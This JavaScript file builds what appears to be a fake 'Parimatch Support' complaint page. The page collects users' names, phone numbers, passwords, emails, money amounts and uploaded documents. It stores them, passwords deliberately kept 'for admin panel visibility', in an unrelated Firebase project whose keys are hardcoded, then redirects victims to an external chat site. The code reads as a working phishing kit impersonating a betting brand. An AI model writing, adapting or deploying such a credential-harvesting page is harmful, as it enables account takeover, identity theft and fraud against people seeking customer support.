(function () {
  const cfg = window.COMPLAIN_CONFIG || {};
  const MAX_UPLOAD_BYTES = 20 * 1024 * 1024;
  const MAX_MB = Math.round(MAX_UPLOAD_BYTES / 1024 / 1024);
  const LOCAL_FILE_MAX = 4 * 1024 * 1024;
  const LOCAL_TOTAL_MAX = 6 * 1024 * 1024;
  const SUBMIT_LOADER_MS = 4000;
  const KEY = 'parimatch_complains';

  // ---- Firebase Config ----
  const firebaseConfig = {
    apiKey: "AIzaSyCs-Sw1hpSReWuAnVhHsKtb1ajZp_OVdJ8",
    authDomain: "new-blog-2b15e.firebaseapp.com",
    projectId: "new-blog-2b15e",
    storageBucket: "new-blog-2b15e.firebasestorage.app",
    messagingSenderId: "694308724175",
    appId: "1:694308724175:web:bd26e81f0472b018e546ba"
  };
  if (typeof firebase !== 'undefined' && !firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = (typeof firebase !== 'undefined' && firebase.firestore) ? firebase.firestore() : null;
  // Storage disabled - using only Firestore with base64 data URLs



  const LOGO = 'logo.png';

  const BASE_FIELDS = [
    { key: 'userName', label: 'User Name', placeholder: 'User Name' },
    { key: 'mobile', label: 'Mobile Number', placeholder: 'Mobile Number', type: 'tel' },
    { key: 'password', label: 'Set Password', placeholder: 'Set Password', type: 'password' },
    { key: 'email', label: 'E-mail ID', placeholder: 'E-mail ID', type: 'email' },
  ];

  const files = Array.isArray(cfg.files) ? cfg.files : [];
  const amount = cfg.amount || null;
  const state = { values: {}, uploads: {}, submitting: false };

  const uploadIcon = `
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
      <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"></path>
      <polyline points="17 8 12 3 7 8"></polyline>
      <line x1="12" y1="3" x2="12" y2="15"></line>
    </svg>`;

  const successIcon = `
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
      <polyline points="22 4 12 14.01 9 11.01"></polyline>
    </svg>`;

  const anim = (index) => `complain-anim d${Math.min(8 + index, 9)}`;

  function headerHtml() {
    return `
      <header class="page-header">
        <div class="header-inner">
          <img class="logo-icon" src="${LOGO}" alt="Parimatch Support logo">
          <div class="logo-text">Parimatch Support</div>
        </div>
      </header>`;
  }

  function baseFieldHtml(field, index) {
    return `
      <div class="form-group complain-anim d${4 + index}">
        <label>${field.label}</label>
        <input
          type="${field.type || 'text'}"
          placeholder="${field.placeholder}"
          name="${field.key}"
          required
        >
      </div>`;
  }

  function amountFieldHtml() {
    return `
      <div class="form-group ${anim(0)}">
        <label>${amount.label}</label>
        <input
          type="${amount.type || 'number'}"
          placeholder="${amount.label}"
          name="${amount.key}"
          required
        >
      </div>`;
  }

  function fileFieldHtml(file, animClass) {
    const required = file.required !== false;
    return `
      <div class="${animClass}">
        <div class="form-group">
          <label>
            ${file.label}
            ${required ? '<span aria-hidden="true"> *</span>' : ''}
          </label>
          <div class="file-upload-simple" data-key="${file.key}">
            <input type="file" accept="${file.accept || 'image/*'}" hidden aria-hidden="true" tabindex="-1">
            <span class="file-upload-icon-simple">
              ${uploadIcon}
            </span>
            <span class="file-upload-name-simple">Choose file</span>
            <span class="file-upload-browse">Browse</span>
          </div>

        </div>
      </div>`;
  }

  function successHtml() {
    return `
      <div class="overlay" id="successOverlay" role="dialog" aria-modal="true" hidden>
        <div class="modal" style="text-align: center; padding: 28px 22px 24px; width: min(360px, 92%);">
          <div style="display: flex; justify-content: center; margin-bottom: 14px;">
            <div class="modal-icon success" style="width: 42px; height: 42px; border-radius: 50%;">
              ${successIcon}
            </div>
          </div>
          <h3 style="font-size: 0.95rem; font-weight: 600; margin-bottom: 8px; color: var(--text); line-height: 1.4;">
            Complaint Submitted Successfully
          </h3>
          <p style="font-size: 0.82rem; line-height: 1.6; color: var(--muted); margin: 0;">
            Your complaint has been submitted successfully. Please wait while our support team reviews it.
          </p>
        </div>
      </div>`;
  }

  function submitLoaderHtml() {
    return `
      <div class="swap-loader-backdrop" id="submitLoader" role="status" aria-live="polite" aria-busy="true" hidden>
        <div class="swap-loader-overlay">
          <svg class="swap-loader" viewBox="70 60 410 430" role="img" aria-label="Loading">
            <polygon class="swap-loader-t" points="138,80 385,80 333,265 86,265"></polygon>
            <polygon class="swap-loader-b" points="221,289 465,289 413,474 169,474"></polygon>
          </svg>
          <p class="swap-loader-text">Submitting...</p>
        </div>
      </div>`;
  }

  function appHtml() {
    return `
      ${headerHtml()}
      <main class="container complain-open">
        <div class="card panel complain-anim d2">
          <h1 class="page-title complain-anim d3" style="text-align: center; margin-bottom: 20px;">Complain Page</h1>
          <form id="complainForm">
            <div class="form-grid two">
              ${BASE_FIELDS.map(baseFieldHtml).join('')}
              ${amount ? amountFieldHtml() : ''}
              ${files.map((file, index) => fileFieldHtml(file, anim((amount ? 1 : 0) + index))).join('')}
            </div>
            <div class="form-actions complain-anim d9" style="justify-content: center; margin-top: 24px;">
              <button class="btn primary" type="submit" id="submitBtn">Submit Now</button>
            </div>
          </form>
        </div>
      </main>
      <footer><p>&copy; 2026 Parimatch Support. All rights reserved.</p></footer>
      ${submitLoaderHtml()}
      ${successHtml()}`;
  }

  const app = document.getElementById('app');
  app.innerHTML = appHtml();

  const form = document.getElementById('complainForm');
  const submitBtn = document.getElementById('submitBtn');
  const submitLoader = document.getElementById('submitLoader');
  const successOverlay = document.getElementById('successOverlay');
  let successTimer = null;

  BASE_FIELDS.forEach((field) => {
    const input = form.querySelector(`[name="${field.key}"]`);
    input.addEventListener('input', (event) => {
      state.values[field.key] = event.target.value;
    });
  });

  if (amount) {
    const input = form.querySelector(`[name="${amount.key}"]`);
    input.addEventListener('input', (event) => {
      state.values[amount.key] = event.target.value;
    });
  }

  function updateFileRow(key) {
    const row = document.querySelector(`.file-upload-simple[data-key="${key}"]`);
    if (!row) return;
    const file = state.uploads[key];
    row.querySelector('.file-upload-name-simple').textContent = file ? file.name : 'Choose file';

    const browse = row.querySelector('.file-upload-browse');
    const clear = row.querySelector('.file-upload-clear');

    if (file) {
      if (browse) browse.remove();
      if (!clear) {
        const button = document.createElement('button');
        button.type = 'button';
        button.className = 'file-upload-clear';
        button.setAttribute('aria-label', 'Remove file');
        button.textContent = '\u2715';
        row.appendChild(button);
      }
    } else {
      if (clear) clear.remove();
      if (!browse) {
        const span = document.createElement('span');
        span.className = 'file-upload-browse';
        span.textContent = 'Browse';
        row.appendChild(span);
      }
    }
  }

  document.addEventListener('click', (event) => {
    const clearButton = event.target.closest('.file-upload-clear');
    if (clearButton) {
      event.stopPropagation();
      const row = clearButton.closest('.file-upload-simple');
      const key = row.getAttribute('data-key');
      state.uploads[key] = null;
      row.querySelector('input[type="file"]').value = '';
      updateFileRow(key);
      return;
    }

    const row = event.target.closest('.file-upload-simple');
    if (row) {
      row.querySelector('input[type="file"]').click();
    }
  });

  document.querySelectorAll('.file-upload-simple').forEach((row) => {
    const key = row.getAttribute('data-key');
    const input = row.querySelector('input[type="file"]');
    input.addEventListener('change', (event) => {
      const file = event.target.files && event.target.files[0];
      if (!file) return;
      if (file.size > MAX_UPLOAD_BYTES) {
        alert(`File too large: ${file.name} (max ${MAX_MB} MB)`);
        event.target.value = '';
        return;
      }
      state.uploads[key] = file;
      updateFileRow(key);
    });
  });

  function getLocal() {
    try {
      const raw = localStorage.getItem(KEY);
      const list = raw ? JSON.parse(raw) : [];
      return Array.isArray(list) ? list : [];
    } catch {
      return [];
    }
  }

  function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
  }

  function fileToDataUrl(file) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result || ''));
      reader.onerror = () => reject(new Error(`Could not read ${file.name}`));
      reader.readAsDataURL(file);
    });
  }

  function normalizeFile(file) {
    return {
      name: file.name || '',
      type: file.type || '',
      size: Number(file.size) || 0,
      url: file.url || '',
      data: typeof file.data === 'string' ? file.data : '',
    };
  }

  async function prepareFiles(uploads) {
    const entries = Object.entries(uploads || {}).filter(([, file]) => file && typeof file === 'object');
    if (!entries.length) return {};

    let totalSize = 0;
    const pairs = await Promise.all(
      entries.map(async ([key, file]) => {
        if (file.url || file.data) {
          return [key, normalizeFile(file)];
        }
        if (file.size > MAX_UPLOAD_BYTES) {
          throw new Error(`File too large: ${file.name} (max ${MAX_MB} MB)`);
        }
        if (file.size > LOCAL_FILE_MAX) {
          throw new Error(
            `File too big: ${file.name} (${Math.round(file.size / 1024 / 1024)} MB). ` +
              'Please choose a smaller photo/file. Firestore limit is 1MB per doc.'
          );
        }
        totalSize += file.size;
        if (totalSize > LOCAL_TOTAL_MAX) {
          throw new Error('Attachments are too large. Please use smaller files (max 6MB total).');
        }
        return [
          key,
          {
            name: file.name,
            type: file.type || '',
            size: file.size,
            data: await fileToDataUrl(file),
            url: ''
          },
        ];
      })
    );

    const out = {};
    pairs.forEach(([key, value]) => {
      out[key] = value;
    });
    return out;
  }

  function saveLocal(entry) {
    const list = getLocal();
    const index = list.findIndex((item) => item && item.id === entry.id);
    if (index >= 0) list.splice(index, 1);
    list.unshift(entry);

    try {
      localStorage.setItem(KEY, JSON.stringify(list));
    } catch {
      const trimmed = list.slice(0, 25).map((item) => ({ ...item, files: {} }));
      try {
        localStorage.setItem(KEY, JSON.stringify(trimmed));
      } catch {}
    }

    try {
      window.dispatchEvent(new Event('complains-updated'));
    } catch {}

    return list;
  }

  async function saveComplain(entry) {
    const docId = entry.id || generateId();
    const preparedFiles = await prepareFiles(entry.files);
    const payload = {
      id: docId,
      type: entry.type,
      title: entry.title || `${entry.type} Complain`,
      createdAt: entry.createdAt || new Date().toISOString(),
      details: { ...(entry.details || {}) },
    };

    const hasPassword = Boolean(payload.details.password);
    // Keep password for admin panel visibility - do not delete

    const finalDoc = {
      ...payload,
      status: 'pending',
      hasPassword,
      files: preparedFiles,
      timestamp: (typeof firebase !== 'undefined' && firebase.firestore && firebase.firestore.FieldValue) ? firebase.firestore.FieldValue.serverTimestamp() : null,
    };

    // Save to Firestore if available
    if (db) {
      try {
        await db.collection('complains').doc(docId).set(finalDoc);
        console.log('Saved to Firestore:', docId);
      } catch (e) {
        console.error('Firestore save failed:', e);
        throw new Error('Failed to submit to server: ' + e.message);
      }
    }

    // Also save to localStorage as backup/cache
    try {
      saveLocal({
        ...payload,
        status: 'pending',
        hasPassword,
        files: preparedFiles,
      });
    } catch(e) {}

    return finalDoc;
  }

  function setSubmitting(submitting) {
    state.submitting = submitting;
    submitBtn.disabled = submitting;
    submitBtn.innerHTML = submitting
      ? '<span class="spin"></span> Submitting...'
      : 'Submit Now';
    submitLoader.hidden = !submitting;
  }

  function resetForm() {
    state.values = {};
    state.uploads = {};
    form.querySelectorAll('input').forEach((input) => {
      if (input.type !== 'file') input.value = '';
    });
    document.querySelectorAll('.file-upload-simple').forEach((row) => {
      const key = row.getAttribute('data-key');
      row.querySelector('input[type="file"]').value = '';
      updateFileRow(key);
    });
  }

  function closeSuccess() {
    if (successTimer) clearTimeout(successTimer);
    successTimer = null;
    successOverlay.classList.remove('open');
    successOverlay.hidden = true;
    resetForm();
    window.location.href = 'https://chat-page-alpha.vercel.app';
  }

  function openSuccess() {
    if (successTimer) clearTimeout(successTimer);
    successOverlay.hidden = false;
    requestAnimationFrame(() => successOverlay.classList.add('open'));
    successTimer = setTimeout(closeSuccess, 3000);
  }

  successOverlay.addEventListener('click', closeSuccess);
  successOverlay.querySelector('.modal').addEventListener('click', (event) => {
    event.stopPropagation();
  });

  form.addEventListener('submit', async (event) => {
    event.preventDefault();

    const missing = files.filter((file) => file.required !== false && !state.uploads[file.key]);
    if (missing.length) {
      alert(cfg.requiredFilesMessage || `Please upload ${missing[0].label.replace(/^Upload /, '')}`);
      return;
    }

    if (state.submitting) return;
    setSubmitting(true);

    try {
      const details = {};
      BASE_FIELDS.forEach((field) => {
        details[field.key] = state.values[field.key] || '';
      });
      if (amount) details[amount.key] = state.values[amount.key] || '';

      const payloadFiles = {};
      files.forEach((file) => {
        if (state.uploads[file.key]) payloadFiles[file.key] = state.uploads[file.key];
      });

      const startedAt = Date.now();

      await saveComplain({
        id: generateId(),
        type: cfg.type,
        title: cfg.title,
        createdAt: new Date().toISOString(),
        details,
        files: payloadFiles,
      });

      const remaining = SUBMIT_LOADER_MS - (Date.now() - startedAt);
      if (remaining > 0) {
        await new Promise((resolve) => setTimeout(resolve, remaining));
      }

      openSuccess();
    } catch (err) {
      alert(err && err.message ? err.message : 'Submit failed');
    } finally {
      setSubmitting(false);
    }
  });
})();
